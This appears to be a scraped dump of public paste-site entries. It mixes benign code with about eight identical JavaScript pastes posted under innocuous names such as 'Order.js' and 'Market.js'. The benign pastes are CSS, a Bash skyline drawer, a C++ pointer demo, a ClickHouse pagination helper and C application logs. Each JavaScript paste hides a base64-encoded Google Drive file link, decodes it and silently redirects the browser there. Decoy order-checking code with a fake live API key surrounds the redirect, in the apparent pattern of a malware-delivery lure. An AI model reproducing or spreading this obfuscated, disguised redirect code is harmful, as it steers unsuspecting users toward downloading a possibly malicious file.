          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3DG3fC6T,cssshell,b3gund4L,CSS,Sunday 20th of April 2025 03:08:01 PM CDT,"body {
    background-color: #1c1c1c;
    font-family: 'Source Code Pro', monospace;
    font-size: 14px;
    font-weight: 400;
    color: #fff;
    padding: 0;
    margin: 0;
}

.terminal-window {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #2d2d2d;
    box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.1);
    border-radius: 5px;
    overflow: hidden;
    width: auto;
    max-width: 90%;
    height: auto;
    max-height: 90%;
}

.terminal-header {
    display: flex;
    align-items: center;
    background-color: #1c1c1c;
    height: 35px;
    padding: 0 10px;
}

.terminal-buttons {
    display: flex;
}

.terminal-button {
    width: 12px;
    height: 12px;
    margin-right: 5px;
    border-radius: 50%;
}

.terminal-button.close {
    background-color: #ff5f56;
}

.terminal-button.minimize {
    background-color: #ffbd2e;
}

.terminal-button.expand {
    background-color: #28c940;
}

.terminal-title {
    flex: 0.9;
    text-align: center;
}

.terminal-body {
    display: flex;
    flex-direction: column;
    padding: 10px;
}

.terminal-output {
    flex: 1;
    padding: 10px;
    overflow-y: auto;
    white-space: pre-wrap;
}

.terminal-output p {
    margin: 0 0 5px 0;
}

.terminal-input {
    display: flex;
    align-items: center;
    background-color: #1c1c1c;
    height: 35px;
    padding: 0 10px;
}

.terminal-input span {
    color: #fff;
    margin-right: 10px;
}

.terminal-input input {
    background-color: transparent;
    border: none;
    font-family: 'Courier New', Courier, monospace;
    font-size: 16px;
    color: #fff;
    flex: 1;
}

table {
    width: 100%;
    border-spacing: 0;
}

td {
    padding: 5px;
    vertical-align: top;
}

.label {
    text-align: right;
    padding-right: 10px;
    color: #ffc107;
}

.value {
    color: #fff;
}

::-webkit-scrollbar {
    width: 10px;
}

::-webkit-scrollbar-thumb {
    background-color: #55555500;
}

@media (max-width: 600px) {
    .terminal-window {
        width: 90%;
        height: auto;
    }
}
"
UVApNA0k,Products.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 02:56:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13244/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mhv9tvVE,Order.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 02:40:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14960/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pQ2m6Zet,city skyline in pure Bash,SergeySamoylov,Bash,Sunday 20th of April 2025 02:30:55 PM CDT,"#!/usr/bin/env bash
# Inspired by Kris Occhipinti's work on YouTube. Thank you!
# https://www.youtube.com/watch?v=io5lIfOdwDM
# GNU General Public License

# Terminal Control Abstraction Layer
declare -A term=(
    [hide_cursor]='\033[?25l'
    [show_cursor]='\033[?25h'
    [reset]='\033[0m'
    [move_to]='\033[%d;%dH'  # row, col
    [block]='█'
    [half_block]='▄'
    [ground]='▁'
)

# 256-color palette definitions
declare -A colors=(
    [black]=0       [red]=1        [green]=2      [yellow]=3
    [blue]=4        [magenta]=5    [cyan]=6       [white]=7
    [bright_black]=8 [bright_red]=9 [bright_green]=10
    [bright_yellow]=11 [bright_blue]=12 [bright_magenta]=13
    [bright_cyan]=14 [bright_white]=15
    [orange]=208    [purple]=93    [pink]=199
)

# Global constants
declare -ri GROUND_ROW=20
declare -ri MIN_WIDTH=6  # 2 left wall + 2 right wall + 2 interior

function set_color() {
    printf ""\033[38;5;%dm"" ""${colors[$1]}""
}

function move_cursor() {
    printf ""${term[move_to]}"" ""$1"" ""$2""
}

function draw_building() {
    local -i left_col=$1
    local -i width=$2
    local -i height=$3
    local color=${4:-blue}
    local window_color=${5:-yellow}

    # Ensure minimum width
    (( width >= MIN_WIDTH )) || width=$MIN_WIDTH
    local -i right_col=$((left_col + width - 1))
    local -i roof_row=$((GROUND_ROW - height))
    local -i interior_start=$((left_col + 2))
    local -i interior_end=$((right_col - 1))

    # Hide cursor and set color
    printf ""%b"" ""${term[hide_cursor]}$(set_color ""$color"")""

    # Draw complete walls and interior in one pass per row
    for ((row = roof_row; row < GROUND_ROW; row++)); do
        # Left wall (exactly 2 solid blocks)
        move_cursor ""$row"" ""$left_col""
        printf ""%s%s"" ""${term[block]}"" ""${term[block]}""
        
        # Interior (full width between walls)
        for ((col = interior_start; col < interior_end; col++)); do
            printf ""%s"" ""${term[block]}""
        done
        
        # Right wall (exactly 2 solid blocks)
        printf ""%s%s"" ""${term[block]}"" ""${term[block]}""
    done

    # Add windows (only on odd rows)
    printf ""%b"" ""$(set_color ""$window_color"")""
    for ((row = roof_row + 1; row < GROUND_ROW; row += 2)); do
        for ((col = interior_start; col < interior_end; col += 2)); do
            move_cursor ""$row"" ""$col""
            printf ""%s"" ""${term[half_block]}""
        done
    done

    # Draw ground shadow
    move_cursor ""$GROUND_ROW"" ""$left_col""
    printf ""%b"" ""$(set_color black)""
    for ((col = left_col; col <= right_col; col++)); do
        printf ""%s"" ""${term[ground]}""
    done
}

function draw_city() {
    # Clear screen and hide cursor
    printf ""%b"" ""${term[reset]}\033[2J${term[hide_cursor]}""

    # Draw perfectly aligned buildings
    draw_building 3 8 12 blue bright_white     # ██▄▄██
    draw_building 10 10 15 green yellow        # ██▄▄▄▄██
    draw_building 19 15 18 red bright_cyan     # ██▄▄▄▄▄▄██
    draw_building 32 8 14 purple orange        # ██▄▄██
    draw_building 39 13 16 cyan bright_red     # ██▄▄▄▄▄██

    # Draw continuous ground line
    printf ""%b"" ""$(set_color white)""
    for ((col = 1; col <= 60; col++)); do
        move_cursor ""$GROUND_ROW"" ""$col""
        printf ""%s"" ""${term[ground]}""
    done

    # Reset and show cursor
    printf ""%b"" ""${term[reset]}""
    move_cursor $((GROUND_ROW + 2)) 1
    printf ""%b"" ""${term[show_cursor]}""
}

clear
# Run the cityscape
draw_city
"
4ZbSMrCK,Market.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 02:25:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25639/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gH9VycSQ,Untitled,hubertzoo90,JavaScript,Sunday 20th of April 2025 02:10:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63550/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UHUEKXd6,Untitled,dllbridge,C,Sunday 20th of April 2025 02:07:53 PM CDT,"


#include <iostream>
using namespace std;


void monitor(int &r);


////////////////////////////////////////////////////////////////
int main() 
{
    int nArr[99] = {22, 2, 4, 6, 7, 5, 3, 5, 61, 83};
   
    monitor(nArr[1]);
    
	
	
return 0;
}



//////////////////////////////////////////////////////////////
void monitor(int &r)
{
     cout << ""nArr[1] = "" << r << endl; 
     
     int *p = &r;
     
     p--;
     
     for(int i = 0; i < 10; i++)
     {
             
             
        cout << *(++p) << endl;
       // p++;         
     }
}






//			                                                                   (   )       
//													                          (    )
//													                           (    )
//													                          (    )
//													                            )  )
//													                           (  (                  /\
//													                            (_)                 /  \  /\
//													                    ________[_]________      /\/    \/  \
//													           /\      /\        ______    \    /   /\/\  /\/\
//													          /  \    //_\       \    /\    \  /\/\/    \/    \
//													   /\    / /\/\  //___\       \__/  \    \/
//													  /  \  /\/    \//_____\       \ |[]|     \
//													 /\/\/\/       //_______\       \|__|      \
//													/      \      /XXXXXXXXXX\                  \
//													        \    /_I_II  I__I_\__________________\
//													               I_I|  I__I_____[]_|_[]_____I
//													               I_II  I__I_____[]_|_[]_____I
//													               I II__I  I     XXXXXXX     I
//				                                                 E-mail:	dllbridge@gmail.com                 














/*

#include     <stdio.h>
#include   <windows.h>

 
int _RGB(unsigned char R, unsigned char G, unsigned char B); 
 
/////////////////////////////////////////////////////////
int main()
{
	
	int n = _RGB(1, 2, 3);
    			 	
    printf(""n = %d\n"", n); 	
    printf(""n = %x\n"", n);
      
return 0;
}



/////////////////////////////////////////////////////////
int _RGB(unsigned char R, unsigned char G, unsigned char B)
{
    
     int nRes = 0;
    
                        nRes  = B;
     nRes = nRes << 8;  nRes += G;
     nRes = nRes << 8;  nRes += R;
     
return nRes;      
}


*/
"
YGsYcmYT,Untitled,gubichas,Python,Sunday 20th of April 2025 02:06:19 PM CDT,"def extract_data_paginated(self, base_query, order_by_column, chunk_size=10000, settings=None):
    """"""
    Извлекает данные из ClickHouse частями (пагинация) с использованием генератора.

    Args:
        base_query (str): Базовый SQL-запрос БЕЗ 'ORDER BY', 'LIMIT', 'OFFSET'.
                          Например: ""SELECT * FROM my_table WHERE date = today()""
        order_by_column (str): Имя колонки или выражения для 'ORDER BY'.
                                 Крайне важно для стабильной пагинации.
                                 Например: 'event_date, unique_id' или просто 'your_date_column'.
        chunk_size (int): Количество строк для извлечения за один запрос (размер чанка).
                          Должно быть <= лимита sqldbclient (рекомендуется 10000).
        settings (dict, optional): Дополнительные настройки ClickHouse ('SETTINGS ...').

    Yields:
        pd.DataFrame: DataFrame с очередной порцией данных (чанком).

    Raises:
        Exception: Если SqlExecutor не инициализирован или произошла ошибка при выполнении запроса.
        ValueError: Если не указан order_by_column или base_query, или chunk_size некорректен.
    """"""
    if self.executor is None:
        logger.error(""Соединение с ClickHouse (SqlExecutor) не установлено."")
        raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")
    if not base_query:
        raise ValueError(""Необходимо указать базовый SQL-запрос ('base_query')."")
    if not order_by_column:
        raise ValueError(""Необходимо указать колонку для сортировки ('order_by_column') для пагинации."")
    if chunk_size <= 0:
        raise ValueError(""'chunk_size' должен быть положительным числом."")

    # --- ИЗМЕНЕНИЕ: Явно проверяем и используем лимит sqldbclient ---
    # Устанавливаем фактический chunk_size не больше 10000, так как sqldbclient все равно ограничит
    effective_chunk_size = min(chunk_size, 10000)
    if chunk_size > 10000:
        logger.warning(f""Запрошенный chunk_size={chunk_size} превышает лимит sqldbclient (10000). ""
                       f""Используется эффективный chunk_size={effective_chunk_size}."")
    else:
        logger.info(f""Используется chunk_size={effective_chunk_size} для пагинации."")


    offset = 0
    total_fetched_count = 0 # Переменная для корректного логгирования общего числа строк
    i = 0 # Счетчик итераций/чанков

    # Формируем часть запроса с SETTINGS
    settings_str = """"
    if settings:
        settings_parts = []
        for key, value in settings.items():
            if isinstance(value, str):
                # Простое экранирование одинарных кавычек внутри строки (если они есть)
                escaped_value = value.replace(""'"", ""\\'"")
                settings_parts.append(f""{key} = '{escaped_value}'"")
            else:
                settings_parts.append(f""{key} = {value}"")
        if settings_parts:
            settings_str = "" SETTINGS "" + "", "".join(settings_parts)

    logger.info(f""Начало пагинации: chunk_size={effective_chunk_size}, сортировка по '{order_by_column}'."")
    logger.debug(f""Базовый запрос: {base_query}"")

    while True:
        i += 1 # Увеличиваем счетчик чанков
        logger.info(f'Запрос чанка #{i} (offset={offset}, limit={effective_chunk_size})')

        # Формируем полный SQL-запрос для текущей страницы
        # --- ИЗМЕНЕНИЕ: Используем effective_chunk_size и убираем FORMAT ---
        paginated_query = f""""""{base_query}
                            ORDER BY {order_by_column}
                            LIMIT {effective_chunk_size}
                            OFFSET {offset}
                            {settings_str}""""""

        logger.debug(
            f""Запрос чанка #{i}: {paginated_query[:500]}{'...' if len(paginated_query) > 500 else ''}"")

        try:
            # Выполняем запрос. sqldbclient сам применит свой лимит (10000),
            # но наш SQL LIMIT {effective_chunk_size} уже соответствует этому.
            chunk_df = self.executor.execute(paginated_query)

            # Проверка и конвертация типа (на всякий случай)
            if not isinstance(chunk_df, pd.DataFrame):
                logger.warning(
                    f""Executor вернул не DataFrame ({type(chunk_df)}) для чанка #{i} (offset={offset}). Конвертация..."")
                try:
                    chunk_df = pd.DataFrame(chunk_df)
                except Exception as conv_err:
                    logger.error(f""Не удалось преобразовать чанк #{i} в DataFrame: {conv_err}. Прерывание."")
                    break  # Прерываем пагинацию

            num_fetched_in_chunk = len(chunk_df)
            logger.debug(f""Чанк #{i}: получено строк: {num_fetched_in_chunk}."")

            if num_fetched_in_chunk > 0:
                # --- ИСПРАВЛЕНИЕ: Корректно считаем общее количество ---
                total_fetched_count += num_fetched_in_chunk
                yield chunk_df # Возвращаем (yield) полученный чанк данных
            else:
                 # Если вернулось 0 строк, значит данных больше нет (даже если num_fetched < effective_chunk_size на пред. шаге)
                 logger.info(f""Чанк #{i}: получено 0 строк. Завершение пагинации."")
                 break

            # --- ИЗМЕНЕНИЕ: Условие выхода из цикла ---
            # Если получено МЕНЬШЕ строк, чем запрашивали (effective_chunk_size),
            # это значит, что это был последний чанк данных.
            if num_fetched_in_chunk < effective_chunk_size:
                logger.info(f""Чанк #{i}: получено {num_fetched_in_chunk} < {effective_chunk_size} строк. Достигнут конец данных."")
                break  # Выходим из цикла

            # --- ИЗМЕНЕНИЕ: Готовимся к следующей итерации ---
            # Смещаемся на размер запрошенного чанка, а не на фактически полученный
            offset += effective_chunk_size

        except Exception as e:
            logger.error(f""Ошибка при извлечении чанка #{i} данных (offset={offset}): {e}"", exc_info=True)
            # Перевыбрасываем ошибку, чтобы ETL пайплайн мог ее обработать
            raise e

    # --- ИСПРАВЛЕНИЕ: Корректный лог общего количества ---
    logger.info(f""Пагинация завершена. Всего извлечено строк: {total_fetched_count}."")"
X668d1me,Products.js,jm33,JavaScript,Sunday 20th of April 2025 01:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79598/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JffjKgSx,Order.js,jm33,JavaScript,Sunday 20th of April 2025 01:39:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38883/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yBwxvQRW,Market.js,jm33,JavaScript,Sunday 20th of April 2025 01:23:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40362/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H7xbFsK5,Untitled,dtorkin,C,Sunday 20th of April 2025 01:20:55 PM CDT,"dtorkin@ubuntu1:~/Desktop/practice$ ./uvm_app
UVM: Загрузка конфигурации...
Configuration loaded successfully from 'config.ini'.
Found configurations for 4 SVM instances.
--- Effective Configuration ---
  interface_type = ethernet
  UVM Target: 192.168.189.129:8080
  SVM 0: Port=8080, LAK=0x08
  SVM 1: Port=8081, LAK=0x09
  SVM 2: Port=8082, LAK=0x0A
  SVM 3: Port=8083, LAK=0x0B
-----------------------------
UVM: Создание интерфейса типа 'ethernet'...
Thread-safe UVM request queue created with capacity 50
Thread-safe Message queue created with capacity 50
UVM: Подключение к SVM через ethernet...
Ethernet: Connected to 192.168.189.129:8080 (handle: 3)
UVM: Успешно подключено (handle: 3)
Выбран режим работы: DR
UVM: Запуск потоков Sender и Receiver...
UVM Sender thread started.
UVM: Потоки запущены.

--- Подготовка к сеансу наблюдения ---
UVM Receiver thread started (handle: 3).
Данные тела сообщения 'Инициализация канала' (первые 20 байт): 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...
Отправка сообщения через Ethernet: Тип=128, Номер=0, Длина тела=2, Общий размер=8, Handle=3
Отправлено сообщение 'Инициализация канала'
Sender Thread: Сообщение отправлено, осталось 0
Sender Thread: Все ожидающие сообщения отправлены, сигналим Main.
Получено сообщение через Ethernet: Тип=129, Номер=0, Длина тела=12, Handle=3
Получено подтверждение инициализации: LAK=0x08, BCB=0x00000000
Данные тела сообщения 'Провести контроль' (первые 20 байт): 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...
Отправка сообщения через Ethernet: Тип=1, Номер=1, Длина тела=1, Общий размер=7, Handle=3
Отправлено сообщение 'Провести контроль'
Sender Thread: Сообщение отправлено, осталось 0
Sender Thread: Все ожидающие сообщения отправлены, сигналим Main.
Получено сообщение через Ethernet: Тип=3, Номер=1, Длина тела=8, Handle=3
Получено подтверждение контроля: LAK=0x08, TK=0x01, BCB=0x00000028
Данные тела сообщения 'Выдать результаты контроля' (первые 20 байт): 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...
Отправка сообщения через Ethernet: Тип=2, Номер=2, Длина тела=1, Общий размер=7, Handle=3
Отправлено сообщение 'Выдать результаты контроля'
Sender Thread: Сообщение отправлено, осталось 0
Sender Thread: Все ожидающие сообщения отправлены, сигналим Main.
Получено сообщение через Ethernet: Тип=4, Номер=2, Длина тела=8, Handle=3
Получены результаты контроля: LAK=0x08, RSK=0x3F, VSK=0x0096, BCB=0x0000003C
Данные тела сообщения 'Выдать состояние линии' (первые 20 байт): 
Отправка сообщения через Ethernet: Тип=6, Номер=3, Длина тела=0, Общий размер=6, Handle=3
Отправлено сообщение 'Выдать состояние линии'
Sender Thread: Сообщение отправлено, осталось 0
Sender Thread: Все ожидающие сообщения отправлены, сигналим Main.
Получено сообщение через Ethernet: Тип=7, Номер=3, Длина тела=16, Handle=3
Получено состояние линии: LAK=0x08, KLA=0x0000, SLA=0x00000000, KSA=0x0000, BCB=0x00000050

--- Подготовка к сеансу съемки - UVM Main: Ожидание завершения отправки сообщений подготовки к съемке...
Данные тела сообщения 'Принять параметры СДР' (первые 20 байт): 01 07 02 01 10 05 20 15 03 00 05 DC 01 0A 09 C4 01 0F 10 11 ...
Отправка сообщения через Ethernet: Тип=170, Номер=4, Длина тела=46, Общий размер=52, Handle=3
Отправлено сообщение 'Принять параметры СДР'
Sender Thread: Сообщение отправлено, осталось 2
Данные тела сообщения 'Принять параметры ЦДР' (первые 20 байт): 00 00 01 00 00 80 00 40 0A 00 00 00 00 00 00 00 00 00 00 00 ...
Отправка сообщения через Ethernet: Тип=210, Номер=5, Длина тела=10, Общий размер=16, Handle=3
Отправлено сообщение 'Принять параметры ЦДР'
Sender Thread: Сообщение отправлено, осталось 1
Данные тела сообщения 'Навигационные данные' (первые 20 байт): 00 
Отправка сообщения через Ethernet: Тип=255, Номер=6, Длина тела=256, Общий размер=262, Handle=3
Отправлено сообщение 'Навигационные данные'
Sender Thread: Сообщение отправлено, осталось 0
Sender Thread: Все ожидающие сообщения отправлены, сигналим Main.
UVM: Все сообщения подготовки к съемке отправлены.
UVM: Ожидание асинхронных сообщений от SVM (или Ctrl+C для завершения)...
^C
UVM: Получен сигнал SIGINT. Завершение...
Thread-safe UVM request queue shutdown initiated.
Thread-safe Message queue shutdown initiated.

UVM: Инициируем завершение потоков...
Thread-safe UVM request queue shutdown initiated.
UVM: Ожидание завершения потоков...
receive_protocol_message: Соединение закрыто при чтении заголовка.
UVM Sender thread finished.
UVM Receiver thread finished.
UVM: Sender thread joined.
UVM: Receiver thread joined.
UVM: Завершение работы и очистка ресурсов...
Ethernet: Closing handle 3
UVM: Соединение закрыто (handle: 3).
Ethernet Interface destroyed.
UVM: Интерфейс IO освобожден.
Thread-safe UVM request queue destroyed
Thread-safe Message queue destroyed
UVM: Очистка завершена.

dtorkin@ubuntu1:~/Desktop/practice$ sudo ./start_svms.sh
Starting 4 SVM instances...
Starting SVM instance 0...
SVM Instance ID: 0
Message handlers initialized.
SVM (ID 0): Loading configuration...
Configuration loaded successfully from 'config.ini'.
Found configurations for 4 SVM instances.
--- Effective Configuration ---
  interface_type = ethernet
  UVM Target: 192.168.189.129:8080
  SVM 0: Port=8080, LAK=0x08
  SVM 1: Port=8081, LAK=0x09
  SVM 2: Port=8082, LAK=0x0A
  SVM 3: Port=8083, LAK=0x0B
-----------------------------
SVM: Creating IO interface type 'ethernet' for port 8080, LAK 0x08...
Thread-safe Message queue created with capacity 100
Thread-safe Message queue created with capacity 100
SVM (LAK 0x08): Starting listener on port 8080...
Ethernet: Listening on port 8080 (handle: 3)
SVM (LAK 0x08) listening (handle: 3). Waiting for 1 UVM connection...
Starting SVM instance 1...
SVM Instance ID: 1
Message handlers initialized.
SVM (ID 1): Loading configuration...
Configuration loaded successfully from 'config.ini'.
Found configurations for 4 SVM instances.
--- Effective Configuration ---
  interface_type = ethernet
  UVM Target: 192.168.189.129:8080
  SVM 0: Port=8080, LAK=0x08
  SVM 1: Port=8081, LAK=0x09
  SVM 2: Port=8082, LAK=0x0A
  SVM 3: Port=8083, LAK=0x0B
-----------------------------
SVM: Creating IO interface type 'ethernet' for port 8081, LAK 0x09...
Thread-safe Message queue created with capacity 100
Thread-safe Message queue created with capacity 100
SVM (LAK 0x09): Starting listener on port 8081...
Ethernet: Listening on port 8081 (handle: 3)
SVM (LAK 0x09) listening (handle: 3). Waiting for 1 UVM connection...
Starting SVM instance 2...
SVM Instance ID: 2
Message handlers initialized.
SVM (ID 2): Loading configuration...
Configuration loaded successfully from 'config.ini'.
Found configurations for 4 SVM instances.
--- Effective Configuration ---
  interface_type = ethernet
  UVM Target: 192.168.189.129:8080
  SVM 0: Port=8080, LAK=0x08
  SVM 1: Port=8081, LAK=0x09
  SVM 2: Port=8082, LAK=0x0A
  SVM 3: Port=8083, LAK=0x0B
-----------------------------
SVM: Creating IO interface type 'ethernet' for port 8082, LAK 0x0A...
Thread-safe Message queue created with capacity 100
Thread-safe Message queue created with capacity 100
SVM (LAK 0x0A): Starting listener on port 8082...
Ethernet: Listening on port 8082 (handle: 3)
SVM (LAK 0x0A) listening (handle: 3). Waiting for 1 UVM connection...
Starting SVM instance 3...
SVM Instance ID: 3
Message handlers initialized.
SVM (ID 3): Loading configuration...
Configuration loaded successfully from 'config.ini'.
Found configurations for 4 SVM instances.
--- Effective Configuration ---
  interface_type = ethernet
  UVM Target: 192.168.189.129:8080
  SVM 0: Port=8080, LAK=0x08
  SVM 1: Port=8081, LAK=0x09
  SVM 2: Port=8082, LAK=0x0A
  SVM 3: Port=8083, LAK=0x0B
-----------------------------
SVM: Creating IO interface type 'ethernet' for port 8083, LAK 0x0B...
Thread-safe Message queue created with capacity 100
Thread-safe Message queue created with capacity 100
SVM (LAK 0x0B): Starting listener on port 8083...
Ethernet: Listening on port 8083 (handle: 3)
SVM (LAK 0x0B) listening (handle: 3). Waiting for 1 UVM connection...
All SVM instances started.
PIDs: 5455 5457 5459 5461
Press Ctrl+C to stop all instances.
